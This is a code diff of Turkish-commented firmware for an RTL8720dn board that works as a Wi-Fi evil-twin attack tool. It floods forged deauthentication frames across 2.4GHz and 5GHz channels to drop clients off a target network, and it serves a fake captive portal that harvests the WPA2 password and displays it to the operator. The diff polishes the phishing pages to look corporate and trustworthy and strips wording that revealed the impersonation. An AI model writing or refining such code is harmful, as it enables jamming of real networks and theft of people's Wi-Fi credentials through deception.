@@ -1,5 +1,5 @@
 // AP+STA Captive Portal — RTL8720dn (AmebaD)
-// NİHAİ SÜRÜM: "Burst Modu" Maksimum Hızlandırılmış 5GHz + 2.4GHz Deauth
+// NİHAİ SÜRÜM: Kurumsal/Profesyonel Arayüz + Cache Sistemi + Burst Mode Deauth
 
 #include "sys_api.h"  
 #include "WiFi.h"
@@ -342,7 +342,6 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     net.rssi = record->signal_strength;
     net.channel = record->channel; 
     
-    // Hedefin MAC Adresini Oku
     memcpy(net.bssid, record->BSSID.octet, 6);
     
     if (record->security == RTW_SECURITY_OPEN) net.enc = ENC_TYPE_NONE;
@@ -441,23 +440,18 @@ void deauthTask(void *param) {
   
   uint8_t deauth_frame[26] = {
     0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Doldurulacak)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Doldurulacak)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
     0x00, 0x00,
-    0x07, 0x00 // Reason Code 7
+    0x07, 0x00 
   };
 
-  // Tüm 5GHz kanallarını tek seferde vurmak için liste
   int common_5g_channels[] = {36, 40, 44, 48, 149};
 
-  Serial.println("\n[Deauth] BURST MODU AKTİF! 5GHz'e isik hizinda kursun yagiyor...");
-
   while (deauth_active) {
-    // === ADIM 1: WEB SUNUCUSUNU YAŞATMAK İÇİN 2.4GHz'e DÖN VE BEKLE ===
+    // 2.4GHz VURUŞU
     wifi_set_channel(target_channel);
-    
-    // 2.4GHz Fuzzing Atışı
     for (int offset = -2; offset <= 2; offset++) {
         uint8_t temp_bssid[6];
         memcpy(temp_bssid, target_bssid, 6);
@@ -466,21 +460,17 @@ void deauthTask(void *param) {
         memcpy(&deauth_frame[10], temp_bssid, 6);
         memcpy(&deauth_frame[16], temp_bssid, 6);
 
-        // Hızlı çift atış
         wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
         wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
-        vTaskDelay(pdMS_TO_TICKS(1)); // Minimum çip koruma molası
+        vTaskDelay(pdMS_TO_TICKS(1)); 
     }
     
-    // DİKKAT: Cihazın Captive Portal sayfasını (Sahte Ağı) telefonda ayakta tutabilmesi 
-    // ve DNS isteklerine cevap verebilmesi için bu kısa dinlenme (150ms) ŞARTTIR.
+    // Web arayüzünün sağlam kalması için 150ms nefes
     vTaskDelay(pdMS_TO_TICKS(150)); 
 
-    // === ADIM 2: BÜTÜN 5GHz KANALLARINA HIZLI (BURST) BASKIN ===
-    // Bekleme süresi koymadan tüm 5GHz kanallarına saniyeden kısa sürede girip çıkacak.
+    // 5GHz BURST (TÜM KANALLAR)
     for(int c=0; c < 5; c++) {
         wifi_set_channel(common_5g_channels[c]);
-        
         for (int offset = -2; offset <= 2; offset++) {
             uint8_t temp_bssid[6];
             memcpy(temp_bssid, target_bssid, 6);
@@ -489,26 +479,21 @@ void deauthTask(void *param) {
             memcpy(&deauth_frame[10], temp_bssid, 6);
             memcpy(&deauth_frame[16], temp_bssid, 6);
 
-            // Her 5GHz varyasyonuna anlık 3 mermi (vTaskDelay olmadan, ardışık!)
             wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
             wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
             wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
             
-            // Watchdog Timer (WDT) çipi sıfırlamasın diye 1 milisaniye koruma
             vTaskDelay(pdMS_TO_TICKS(1)); 
         }
     }
-    // Tur biter bitmez döngü başa döner ve anında 2.4GHz'e geri zıplar.
   }
-  
-  Serial.println("[Deauth] Saldiri Basariyla Sonlandirildi.");
   vTaskDelete(NULL);
 }
 // ─────────────────────────────────────────────────────────────────────────────
 
 // ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
 String rssiBar(int32_t rssi) {
-  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mukemmel";
+  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Cok Iyi";
   if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; Iyi";
   if (rssi > -75) return "&#9608;&#9608;&#9617;&#9617; Orta";
   return "&#9608;&#9617;&#9617;&#9617; Zayif";
@@ -530,19 +515,20 @@ String parsePostParam(const String &body, const String &key) {
   return urlDecode(body.substring(start, end));
 }
 
-// CSS VERİSİ
+// CSS VERİSİ (Daha Kurumsal Renk Tonları)
 static const char CSS_STR[] PROGMEM =
-  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
-  ".card{background:#16213e;border-radius:14px;padding:24px;width:100%;max-width:500px;box-shadow:0 8px 32px rgba(0,0,0,.4)}"
-  "h1{font-size:1.4rem;color:#e94560;text-align:center;margin-bottom:6px}.sub{text-align:center;font-size:.85rem;color:#aaa;margin-bottom:20px}"
-  ".status-box{border-radius:8px;padding:10px 14px;margin-bottom:18px;font-size:.9rem;font-weight:bold}.ok{background:#0a3d2e;border:1px solid #27ae60;color:#2ecc71}.err{background:#3d0a0a;border:1px solid #e74c3c;color:#e74c3c}.wait{background:#0a2040;border:1px solid #3498db;color:#5dade2}"
-  ".conn-status{border-radius:8px;padding:12px;margin-bottom:16px;font-size:.9rem;background:#0d1b2e;border:1px solid #2980b9;line-height:1.4}h2{font-size:1rem;color:#ccc;margin-bottom:10px;border-bottom:1px solid #2c3e50;padding-bottom:6px}"
-  ".net-list{list-style:none;margin-bottom:18px;max-height:250px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:10px 12px;border-radius:8px;margin-bottom:6px;cursor:pointer;border:2px solid transparent;background:#0f3460;transition:border-color .2s}.net-item:hover{border-color:#e94560}"
-  ".net-item input[type=radio]{margin-right:10px;accent-color:#e94560;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:bold;font-size:.95rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.75rem;color:#aaa;margin-top:2px}"
-  ".pass-wrap{margin-bottom:16px}label{display:block;font-size:.85rem;color:#aaa;margin-bottom:6px}input[type=password]{width:100%;padding:10px 12px;border-radius:7px;border:1px solid #2c3e50;background:#0d1b2e;color:#eee;font-size:.95rem;outline:none}input:focus{border-color:#e94560}"
-  ".show-pass{font-size:.8rem;color:#aaa;margin-top:6px;cursor:pointer;user-select:none}button{width:100%;padding:13px;border:none;border-radius:8px;background:#e94560;color:#fff;font-size:1rem;font-weight:bold;cursor:pointer;margin-bottom:10px}.btn-blue{background:#2980b9}"
-  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #5dade2;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:6px}@keyframes spin{to{transform:rotate(360deg)}}"
-  ".footer{text-align:center;font-size:.75rem;color:#555;margin-top:8px}</style>";
+  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f4f6f9;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
+  ".card{background:#ffffff;border-radius:12px;padding:32px 24px;width:100%;max-width:450px;box-shadow:0 10px 25px rgba(0,0,0,.08);border-top:5px solid #2980b9}"
+  "h1{font-size:1.5rem;color:#2c3e50;text-align:center;margin-bottom:8px}.sub{text-align:center;font-size:0.9rem;color:#7f8c8d;margin-bottom:24px;line-height:1.5}"
+  ".status-box{border-radius:8px;padding:12px 16px;margin-bottom:20px;font-size:0.95rem;font-weight:bold;text-align:center}.ok{background:#e8f8f5;border:1px solid #27ae60;color:#27ae60}.err{background:#fdedec;border:1px solid #e74c3c;color:#c0392b}.wait{background:#ebf5fb;border:1px solid #2980b9;color:#2980b9}"
+  ".conn-status{border-radius:8px;padding:14px;margin-bottom:20px;font-size:1rem;background:#f8f9f9;border:1px solid #d5dbdb;line-height:1.5;color:#34495e;text-align:center}h2{font-size:1.1rem;color:#2c3e50;margin-bottom:12px;border-bottom:2px solid #ecf0f1;padding-bottom:8px}"
+  ".net-list{list-style:none;margin-bottom:20px;max-height:260px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:12px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;border:1px solid #eaeded;background:#fff;transition:all .2s}.net-item:hover{border-color:#3498db;background:#f4f6f9}"
+  ".net-item input[type=radio]{margin-right:12px;accent-color:#2980b9;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:600;font-size:1rem;color:#2c3e50;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.8rem;color:#95a5a6;margin-top:4px}"
+  ".pass-wrap{margin-bottom:20px}label{display:block;font-size:.9rem;font-weight:600;color:#34495e;margin-bottom:8px}input[type=password],input[type=text]{width:100%;padding:12px 14px;border-radius:8px;border:1px solid #bdc3c7;background:#fff;color:#2c3e50;font-size:1rem;outline:none;transition:border .2s}input:focus{border-color:#2980b9}"
+  ".show-pass{font-size:.85rem;color:#7f8c8d;margin-top:8px;cursor:pointer;user-select:none;text-align:right}button{width:100%;padding:14px;border:none;border-radius:8px;background:#2980b9;color:#fff;font-size:1.05rem;font-weight:bold;cursor:pointer;transition:background .2s}.btn-blue{background:#34495e}button:hover{background:#2471a3}"
+  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #2980b9;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}"
+  ".footer{text-align:center;font-size:.8rem;color:#bdc3c7;margin-top:16px;border-top:1px solid #ecf0f1;padding-top:12px}"
+  "#offline-bar{position:fixed;top:0;left:0;width:100%;background:#e74c3c;color:#fff;text-align:center;padding:12px;font-weight:bold;font-size:0.9rem;z-index:9999;display:none;box-shadow:0 2px 10px rgba(0,0,0,0.1)}</style>";
 
 void sendChunkedCSS(WiFiClient &client) {
   const char *p = CSS_STR;
@@ -556,20 +542,33 @@ void sendChunkedCSS(WiFiClient &client) {
   }
 }
 
+// Ortak JavaScript (Bağlantı kopsa bile sayfayı ayakta tutar)
+void sendOfflineScript(WiFiClient &client) {
+  client.print("<div id='offline-bar'>&#9888; Ag baglantisi zayif, yeniden baglaniliyor... Lutfen bekleyiniz.</div>");
+  client.print("<script>");
+  client.print("window.addEventListener('offline', function(){ document.getElementById('offline-bar').style.display='block'; });");
+  client.print("window.addEventListener('online', function(){ document.getElementById('offline-bar').style.display='none'; });");
+  client.print("</script>");
+}
+
 // ─── SAYFALAR ────────────────────────────────────────────────────────────────
 void sendStartPage(WiFiClient &client) {
-  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store\r\n\r\n");
+  // YENİ: Cache sistemi aktif (Sayfanın bozulmasını engeller)
+  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: public, max-age=3600\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Guvenli Kurulum - Ag Secimi</title>");
+  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Internet Erisim Yoneticisi</title>");
   sendChunkedCSS(client);
-  client.print("</head><body><div class='card'><h1>&#128274; Guvenli Kurulum</h1><p class='sub'>Lutfen hedef aginizi listeden secin</p>");
+  client.print("</head><body>");
+  sendOfflineScript(client);
+  
+  client.print("<div class='card'><h1>&#128246; Internet Erisim Yoneticisi</h1><p class='sub'>Lutfen baglanmak istediginiz agi seciniz.</p>");
 
   if (scan_status == SCAN_RUNNING) {
-      client.print("<div class='status-box wait'>&#128225; Cevredeki aglar araniyor...</div>");
+      client.print("<div class='status-box wait'>&#128225; Cevre aglar taranikyor, lutfen bekleyiniz...</div>");
   }
 
   if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
-  client.print("<h2>&#128225; Kullanilabilir Aglar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");
+  client.print("<h2>&#128225; Taranan Aglar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");
 
   for (int i = 0; i < (int)networks.size(); i++) {
     String safe = networks[i].ssid;
@@ -578,72 +577,79 @@ void sendStartPage(WiFiClient &client) {
     client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
     client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
     client.print("<div class='net-info'><div class='net-name'>"); client.print(safe); client.print("</div>");
-    client.print("<div class='net-meta'>"); client.print(rssiBar(networks[i].rssi)); client.print(" &nbsp;|&nbsp; Kanal: "); client.print(networks[i].channel); client.print("</div></div></li>");
+    client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>"); // KANAL BİLGİSİ KALDIRILDI
   }
   if (networks.empty() && scan_status != SCAN_RUNNING) {
-      client.print("<li style='padding:16px;text-align:center;color:#aaa;'>Ag bulunamadi.</li>");
+      client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>Herhangi bir ag bulunamadi.</li>");
   }
   if (networks_mutex) xSemaphoreGive(networks_mutex);
 
-  client.print("</ul><button type='submit'>Kurulumu Baslat</button></form>");
-  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue'>&#8635; Yeniden Ara</button></form>");
+  client.print("</ul><button type='submit'>Ileri</button></form>");
+  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Aglari Yenile</button></form>");
 
+  // YAKALANAN ŞİFRELERİ SİLME EKRANI (Panel Sahibi İçin)
   if (strlen(saved_ssid) > 0) {
-    client.print("<div style='background:#0a2040;border:1px solid #3498db;border-radius:8px;padding:12px;margin-top:16px;'>");
-    client.print("<h3 style='font-size:0.9rem;color:#5dade2;margin-bottom:8px;text-align:center;'>&#128190; Yakalanan Ag Sifresi</h3>");
-    client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#0d1b2e;padding:10px;border-radius:6px;'>");
+    client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
+    client.print("<h3 style='font-size:0.9rem;color:#2980b9;margin-bottom:8px;text-align:center;'>Sistem Kayitlari</h3>");
+    client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#f4f6f9;padding:10px;border-radius:6px;'>");
     client.print("<div style='display:flex;flex-direction:column;font-size:0.85rem;'>");
-    client.print("<span style='color:#ccc;'><b>Ag:</b> <span style='color:#fff;'>"); client.print(saved_ssid); client.print("</span></span>");
-    client.print("<span style='color:#ccc;margin-top:4px;'><b>Sifre:</b> <span style='color:#2ecc71;'>"); client.print(saved_pass); client.print("</span></span>");
+    client.print("<span style='color:#34495e;'><b>Ag:</b> <span style='color:#2c3e50;'>"); client.print(saved_ssid); client.print("</span></span>");
+    client.print("<span style='color:#34495e;margin-top:4px;'><b>Sifre:</b> <span style='color:#27ae60;'>"); client.print(saved_pass); client.print("</span></span>");
     client.print("</div>");
     client.print("<form method='POST' action='/delete_cred' style='margin:0;'>");
-    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;'>Sil</button>");
+    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;'>Temizle</button>");
     client.print("</form></div></div>");
   }
-  client.print("<div class='footer'>Mevcut Yonetim Agi: X</div></div></body></html>");
+  client.print("<div class='footer'>&copy; 2026 Ag Guvenlik Yonetimi</div></div></body></html>");
 }
 
 void sendSwitchingPage(WiFiClient &client) {
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ag Klonlaniyor</title>");
-  client.print("<style>body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;text-align:center;padding:50px 20px;} b{color:#e94560;}</style></head><body>");
-  client.print("<h2 style='color:#e94560;'>&#9888; 'X' Agi Kapatiliyor...</h2>");
-  client.print("<p style='color:#aaa;font-size:18px;margin-top:20px;line-height:1.6'>Cihaz klonlama moduna gecti! Lutfen Wi-Fi ayarlariniza gidin ve yeni acilan sifresiz <b>");
+  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Baglanti Hazirlaniyor</title>");
+  client.print("<style>body{font-family:Arial,sans-serif;background:#f4f6f9;color:#333;text-align:center;padding:50px 20px;} b{color:#2980b9;}</style></head><body>");
+  client.print("<h2 style='color:#2c3e50;'>&#8987; Guvenli Baglanti Hazirlaniyor...</h2>");
+  client.print("<p style='color:#7f8c8d;font-size:16px;margin-top:20px;line-height:1.6'>Lutfen WiFi ayarlarina giderek <b>");
   client.print(target_ssid);
-  client.print("</b> agina baglanin.</p></body></html>");
+  client.print("</b> agina tekrar baglaniniz.</p></body></html>");
 }
 
 void sendPortalPage(WiFiClient &client, bool show_result) {
-  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store\r\n\r\n");
+  // YENİ: Cache sistemi ile "Bozuk Sayfa" (Dinozor) görme engellendi
+  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: public, max-age=3600\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>WiFi Sifre Onayi</title>");
+  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Guvenlik Dogrulamasi</title>");
   sendChunkedCSS(client);
 
-  client.print("</head><body><div class='card'><h1>&#128273; WiFi Sifre Dogrulamasi</h1>");
-  client.print("<p class='sub'>Lutfen taklit edilen bu agin gercek anahtarini girin</p>");
+  client.print("</head><body>");
+  sendOfflineScript(client); // JS Offline Koruyucu
+  
+  client.print("<div class='card'><h1>&#128274; Guvenlik Dogrulamasi</h1>");
+  client.print("<p class='sub'>Internet erisiminizi saglamak icin guvenlik anahtarini girmeniz gerekmektedir.</p>");
 
   if (conn_status == CS_RUNNING) {
-      client.print("<div class='status-box wait'><span class='spinner'></span>Istasyona Baglaniliyor...</div>");
+      client.print("<div class='status-box wait'><span class='spinner'></span>Baglanti kontrol ediliyor, lutfen bekleyiniz...</div>");
   } else if (show_result) {
-    if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Baglanti basarili! Kurulum tamamlandi.</div>");
-    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Baglanti basarisiz. Sifreyi kontrol edin.</div>");
+    if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Kimlik dogrulama basarili. Internet erisimi saglaniyor...</div>");
+    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiginiz sifre hatali. Lutfen tekrar deneyiniz.</div>");
   }
 
-  client.print("<div class='conn-status'>Secilen Baglanti Agi: <b>"); client.print(target_ssid);
-  client.print("</b><br><small style='color:#aaa'>Frekans Eslemesi (Kanal): "); client.print(target_channel); client.print("</small></div>");
+  // TERTEMİZ BAĞLANTI DURUM KUTUSU
+  client.print("<div class='conn-status'>Erisim Saglanacak Ag:<br><b style='font-size:1.2rem; display:block; margin-top:6px;'>"); 
+  client.print(target_ssid);
+  client.print("</b></div>");
   
-  // SADE ŞİFRE GİRİŞ FORMU
-  client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>Sifre Giriniz</label>");
-  client.print("<input type='password' id='pass' name='pass' placeholder='Sifreyi buraya yazin...' autocomplete='off' required>");
-  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Goster/Gizle</div></div>");
-  client.print("<button type='submit'>&#128273; Onayla ve Baglan</button></form>");
+  // PROFESYONEL ŞİFRE GİRİŞ FORMU
+  client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>WPA2 Guvenlik Anahtari (Sifre)</label>");
+  client.print("<input type='password' id='pass' name='pass' placeholder='Sifrenizi buraya giriniz...' autocomplete='off' required>");
+  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Sifreyi Goster</div></div>");
+  client.print("<button type='submit'>&#10148; Baglantiyi Dogrula</button></form>");
   
   if (conn_status == CS_RUNNING) {
-      client.print("<script>function tryR(){fetch('/',{cache:'no-store',signal:AbortSignal.timeout(3000)}).then(function(r){if(r.ok){window.location.href='/';}else{setTimeout(tryR,2000);}}).catch(function(){setTimeout(tryR,2000);});}setTimeout(tryR,3000);</script>");
+      client.print("<script>function tryR(){fetch('/',{cache:'no-store',signal:AbortSignal.timeout(4000)}).then(function(r){if(r.ok){window.location.href='/';}else{setTimeout(tryR,2000);}}).catch(function(){setTimeout(tryR,2000);});}setTimeout(tryR,3000);</script>");
   }
   
-  client.print("<div class='footer'>Hedef Maskeleme Aktif</div></div></body></html>");
+  client.print("<div class='footer'>&copy; 2026 Ag Guvenlik Yonetimi</div></div></body></html>");
 }
 
 // ─── HTTP İŞLEYİCİSİ ─────────────────────────────────────────────────────────
@@ -767,7 +773,7 @@ void handleClient(WiFiClient &client) {
 // ─── Setup ───────────────────────────────────────────────────────────────────
 void setup() {
   Serial.begin(115200); delay(500);
-  Serial.println("\n[Boot] Cihaz Aciliyor... BURST (Maksimum Hizli) Deauth Aktif!");
+  Serial.println("\n[Boot] Cihaz Aciliyor... Kurumsal Arayuz ve Burst Deauth Aktif!");
 
   networks_mutex = xSemaphoreCreateMutex();
   
